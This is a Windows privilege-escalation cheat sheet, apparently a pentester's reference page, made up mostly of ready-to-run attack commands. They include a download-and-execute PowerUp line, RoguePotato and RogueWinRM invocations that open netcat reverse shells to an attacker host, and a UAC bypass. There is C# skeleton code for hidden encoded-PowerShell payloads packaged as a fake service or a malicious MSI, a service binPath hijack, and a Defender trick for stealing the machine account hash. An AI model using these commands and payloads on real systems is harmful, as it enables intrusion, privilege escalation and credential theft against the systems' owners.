# Windows

### Enumeration

#### PrivEscCheck

[https://raw.githubusercontent.com/itm4n/PrivescCheck/master/Invoke-PrivescCheck.ps1](https://raw.githubusercontent.com/itm4n/PrivescCheck/master/Invoke-PrivescCheck.ps1)

```text
PS C:\Temp\> Set-ExecutionPolicy Bypass -Scope Process -Force 
PS C:\Temp\> . .\Invoke-PrivescCheck.ps1; Invoke-PrivescCheck
```

or:

```text
powershell -ep bypass -c ". .\Invoke-PrivescCheck.ps1; Invoke-PrivescCheck | Tee-Object result.txt
```

#### PowerUp

```bash
IEX(New-Object Net.WebClient).downloadString('<url>/PowerUp.ps1') ;Invoke-AllChecks
```

#### Unquoted Service Paths

```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
```

### Common CVEs

#### CVE-2019-1388: Windows Privilege Escalation Through UAC

[https://www.youtube.com/watch?v=3BQKpPNlTSo](https://www.youtube.com/watch?v=3BQKpPNlTSo)

Download & start hhupd.exe, get it to start a iexplore.exe in the uac dialog and start cmd.exe in the browsers save file dialog

### Privilege Abuse

If privileges are disabled you can use [AdjustTokenPrivileges](https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges). All these privileged are configured via "secpol.msc -&gt; Local Policies -&gt; User Rights Assignment".

#### SeBackupPrivilege/SeRestorePrivilege

These privileges allow unrestricted read/write access to every file on the system. They have to be activated first though for which you can use this [ps-script](https://github.com/giuliano108/SeBackupPrivilege):

```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege
Copy-FileSeBackupPrivilege <source> <target>
```

#### SeImpersonatePrivilege

This privilege allows to impersonate the user connecting. This connection can happen via HTTP NTLM Auth, SMB or Named Pipes.

[PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

This was patched in August 2020 \(spooler won't connect to your named pipe anymore, the underlying technique still works though\).

[RoguePotato](https://github.com/antonioCoco/RoguePotato)

This requires that the victim server can reach your box on port 135. You run the OxidResolver and use socat to port your port 135 to the OxidResolvers port. Then you can the exploit:

```bash
# on attacker box
socat tcp-listen:135,reuseaddr,fork tcp:<oxidip>:9999
# on target
RoguePotato.exe -r <attackerip> -e "c:\programdata\nc.exe -e cmd.exe <ip> <port>" -l 9999
```

[RogueWinrm](https://github.com/antonioCoco/RogueWinRM)

Useable if WinRM is not already is not running \(Unpatched\). Usage \(don't quote path\):

```text
RogueWinRM.exe -p C:\windows\temp\nc64.exe -a "<ip> <port> -e cmd"
```

### Bypassing UAC

There are lots of different ones out there, a good collection is [UACME](https://github.com/hfiref0x/UACME) but it is getting detected very easily. In Covenant you can do:

```text
BypassUACCommand cmd.exe "/c powershell -enc <cmd>"
```

### Service Abuse

Check Permissions on a service:

```text
PowerShell 'service name' | Get-ServiceAcl | Select-Object -ExpandProperty Access
```

For a payload that behaves like a real service use the following skeleton code \(create a new c\# console application\):

```csharp
protected override void OnStart(string[] args)
{
  var si = new ProcessStartInfo
  {
    FileName = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
    Arguments = @"-Sta -Nop -Window Hidden -EncodedCommand <cmd>"
  };
          
  var proc = new Process
  {
    StartInfo = si
  };
        
  var t = new Thread(() =>
  {
    proc.Start();
    proc.WaitForExit();
    proc.Dispose();
  });

  t.Start();
}
```

Finally modify & restart the service: 

```text
sc config "service name" binPath= "c:\temp\x.exe"
sc qc "service name"
sc stop "service name"
sc start "service name"
```

### Always Install Elevated

Create a MSI Installer in Visual Studio. Skeleton:

```csharp
using System.Diagnostics;

namespace Service
{
    class Program
    {
        static void Main(string[] args)
        {
            var si = new ProcessStartInfo
            {
                FileName = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                Arguments = @"-Sta -Nop -Window Hidden -EncodedCommand <cmd>"
            };
            
            var proc = new Process
            {
                StartInfo = si
            };
            
            proc.Start();
            proc.WaitForExit();
            proc.Dispose();
        }
    }
}
```

Set output type to WindowsApplication, add a new project to the solution \(of type SetupWizard\). Make sure it includes "primary output from &lt;project&gt;". Modify settings as you need. To make sure it gets installed right-click on the installer project: View-&gt;CustomActions. Then add a custom action to install that containts the primary output from before.

Finally run:

```text
msiexec /i <filename> /qn
```

### Restoring Service Privileges

{% embed url="https://github.com/itm4n/FullPowers" %}

### Stealing Machine Account Hash from a Low Privileged Shell

#### Via Defender

Run Windows Defender vs. SMB share to get the machine account hash:

```text
C:\progra~1\Window~1\Mpcmdrun.exe -Scan -ScanType 3 -File '\\<ip>\public\file'
```

This hash can be cracked via crack.sh or if the target is a DC, we can pth to secretsdump \(requires NT hash support \(deprecated\)\).

### Tools

* [PrivescCheck](https://github.com/itm4n/PrivescCheck.git)
* [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1)
* [SharpUp](https://github.com/GhostPack/SharpUp)
* [Watson](https://github.com/rasta-mouse/Watson)
* [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

